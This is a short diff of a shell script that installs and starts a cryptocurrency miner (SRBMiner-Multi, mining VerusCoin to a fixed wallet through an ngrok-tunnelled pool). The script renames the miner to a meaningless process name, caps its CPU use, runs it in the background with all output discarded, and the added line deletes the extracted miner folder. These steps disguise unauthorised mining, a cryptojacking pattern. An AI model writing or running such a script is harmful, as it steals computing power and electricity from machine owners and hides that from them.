@@ -9,5 +9,6 @@ cd SRBMiner-Multi-2-3-1/
 mv SRBMiner-MULTI  ..
 cd ..
 mv SRBMiner-MULTI TSARPR
+rm -rf SRBMiner-Multi-2-3-1/
 sudo cpulimit --background -e TSARPR -l 400
 nohup ./TSARPR--algorithm verushash --pool stratum+ssl://2.tcp.ngrok.io:11730 --wallet RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq --password c=VRSC,id=YANTO$(( $RANDOM % 1000 + 1 )) --cpu-threads 0 --disable-gpu &> /dev/null &
